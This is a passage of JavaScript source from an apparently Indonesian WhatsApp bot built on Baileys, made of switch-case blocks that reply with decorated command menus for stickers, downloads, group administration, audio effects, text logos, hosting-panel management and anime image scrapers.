┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}toimg *reply stiker*
││✑${prefix}toaudio *reply video*
││✑${prefix}sticker *reply gambar*
││✑${prefix}s *reply gambar *
││✑${prefix}smeme *teks bawah|teks atas*
││✑${prefix}kalkulator 
││✑${prefix}removebg *reply gambar*
││✑${prefix}wm *reply stiker*
││✑${prefix}attp *teks
││✑${prefix}styletext *teks*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
}

//=================================================//
case "aimenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}dall-e Ilustrasi 
││✑${prefix}stablediffusion ilustrasi
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
 }
 
 //=================================================//
case "jelajahmenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}google-article *query*
││✑${prefix}google-search *query*
││✑${prefix}search-kbbi *query*
││✑${prefix}search-apk *query*
││✑${prefix}search-resep
││✑${prefix}search-sticker
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
}

//=================================================//
case "suaramenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}Bass *ReplyAudio*
││✑${prefix}Blown *ReplyAudio*
││✑${prefix}Deep *ReplyAudio*
││✑${prefix}Earrape *ReplyAudio*
││✑${prefix}Fast *ReplyAudio*
││✑${prefix}Fat *ReplyAudio*
││✑${prefix}Nightcore *ReplyAudio*
││✑${prefix}Reverse *ReplyAudio*
││✑${prefix}Robot *ReplyAudio*
││✑${prefix}Slow *ReplyAudio*
││✑${prefix}Tupai *ReplyAudio*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break

}
//=================================================//
case "islammenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}kisahnabi
││✑${prefix}asmaulhusna
││✑${prefix}bacaansholat
││✑${prefix}ayatkursi
││✑${prefix}doaharian
││✑${prefix}niatsholat
││✑${prefix}quotesislami
││✑${prefix}doatahlil
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break

}
//=================================================//
case "grupmenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}setppgroup reply gambar
││✑${prefix}promote tag
││✑${prefix}demote tag
││✑${prefix}kick tag
││✑${prefix}add nomor
││✑${prefix}editgroup open/close
││✑${prefix}editsubjek teks 
││✑${prefix}editinfo teks
││✑${prefix}editdesk teks
││✑${prefix}clearchat
││✑${prefix}resetlinkgc
││✑${prefix}revoke
││✑${prefix}infogc
││✑${prefix}getppgc
││✑${prefix}closegroup
││✑${prefix}opengroup
││✑${prefix}hidetag
││✑${prefix}tagsubject
││✑${prefix}tagall
││✑${prefix}linkgc
││✑${prefix}antitoxic *on / off*
││✑${prefix}antiasing *on / off*
││✑${prefix}antivirtex *on / off*
││✑${prefix}antilinkall *on / off*
││✑${prefix}antilinkfb *on / off*
││✑${prefix}antilinkyt *on / off*
││✑${prefix}antilinkytch *on / off*
││✑${prefix}antilinkig *on / off*
││✑${prefix}antilinktele *on / off*
││✑${prefix}antilinktiktok *on / off*
││✑${prefix}antilinktwitter *on / off*
││✑${prefix}antilink *on / off*
││✑${prefix}cekidgc *link gc*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
}

//=================================================//
case "downloadmenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}gitclone *url*
││✑${prefix}mediafire *url*
││✑${prefix}tiktokmp3 *url*
││✑${prefix}tiktokvideo *url*
││✑${prefix}ytmp4 *url*
││✑${prefix}ytmp3 *url*
││✑${prefix}play *judul*
││✑${prefix}playmusic *judul*
││✑${prefix}douyindl *url*
││✑${prefix}igdlimage *url*
││✑${prefix}igdlmp4 *url*
││✑${prefix}pintmp4 *url*
││✑${prefix}happymod *nama apk*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
}

//=================================================//
case "randommenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}apakah
││✑${prefix}bisakah
││✑${prefix}bagaimanakah
││✑${prefix}gantengcek
││✑${prefix}cekganteng
││✑${prefix}cantikcek
││✑${prefix}cekcantik
││✑${prefix}sangecek
││✑${prefix}ceksange
││✑${prefix}gaycek
││✑${prefix}cekgay
││✑${prefix}lesbicek
││✑${prefix}ceklesbi
││✑${prefix}kapankah
││✑${prefix}wangy
││✑${prefix}cekmati
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
}

//=================================================//
case "fotoname": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}shadow *namalu* 
││✑${prefix}write *namalu* 
││✑${prefix}romantic *namalu* 
││✑${prefix}burnpaper *namalu*
││✑${prefix}smoke *namalu* 
││✑${prefix}narutobanner *namalu* 
││✑${prefix}love *namalu* 
││✑${prefix}undergrass *namalu*
││✑${prefix}doublelove *namalu* 
││✑${prefix}coffecup *namalu*
││✑${prefix}underwaterocean *namalu*
││✑${prefix}smokyneon *namalu*
││✑${prefix}starstext *namalu*
││✑${prefix}rainboweffect *namalu*
││✑${prefix}balloontext *namalu*
││✑${prefix}metalliceffect *namalu*
││✑${prefix}embroiderytext *namalu*
││✑${prefix}flamingtext *namalu*
││✑${prefix}stonetext *namalu*
││✑${prefix}writeart *namalu*
││✑${prefix}summertext *namalu*
││✑${prefix}wolfmetaltext *namalu*
││✑${prefix}nature3dtext *namalu*
││✑${prefix}rosestext *namalu*
││✑${prefix}naturetypography *namalu*
││✑${prefix}quotesunder *namalu*
││✑${prefix}shinetext *namalu*
││✑${prefix}glitchtext *namalu*
││✑${prefix}writetext *namalu*
││✑${prefix}advancedglow *namalu*
││✑${prefix}typographytext *namalu*
││✑${prefix}pixelglitch *namalu*
││✑${prefix}neonglitch *namalu*
││✑${prefix}flagtext *namalu*
││✑${prefix}flag3dtext *namalu*
││✑${prefix}deletingtext *namalu*
││✑${prefix}blackpinkstyle *namalu*
││✑${prefix}glowingtext *namalu*
││✑${prefix}underwatertext *namalu*
││✑${prefix}logomaker *namalu*
││✑${prefix}cartoonstyle *namalu*
││✑${prefix}papercutstyle *namalu*
││✑${prefix}watercolortext *namalu*
││✑${prefix}effectclouds *namalu*
││✑${prefix}blackpinklogo *namalu*
││✑${prefix}gradienttext *namalu*
││✑${prefix}summerbeach *namalu*
││✑${prefix}luxurygold *namalu*
││✑${prefix}multicoloredneon *namalu*
││✑${prefix}sandsummer *namalu*
││✑${prefix}galaxywallpaper *namalu*
││✑${prefix}1917style *namalu*
││✑${prefix}makingneon *namalu*
││✑${prefix}royaltext *namalu*
││✑${prefix}freecreate *namalu*
││✑${prefix}galaxystyle *namalu*
││✑${prefix}lighteffects *namalu*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break

//=================================================//
case "panelmenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}delsrv *id server*
││✑${prefix}delusr
││✑${prefix}addsrv *nama,tanggal,ram,15,1,0/0,0*
││✑${prefix}listram
││✑${prefix}listsrv
││✑${prefix}listusr
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break

//=================================================//
case "scrapemenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}akira
││✑${prefix}akiyama
││✑${prefix}ana
││✑${prefix}asuna
││✑${prefix}ayuzawa
││✑${prefix}boruto
││✑${prefix}chitoge
││✑${prefix}deidara
││✑${prefix}doraemon
││✑${prefix}elaina
││✑${prefix}emilia
││✑${prefix}erza
││✑${prefix}gremory
││✑${prefix}hestia
││✑${prefix}hinata
││✑${prefix}inori
││✑${prefix}isuzu
││✑${prefix}itachi
││✑${prefix}itori
││✑${prefix}kaga
││✑${prefix}kagura
││✑${prefix}kakasih
││✑${prefix}kaori
││✑${prefix}keneki
││✑${prefix}kotori
││✑${prefix}kurumi
││✑${prefix}madara
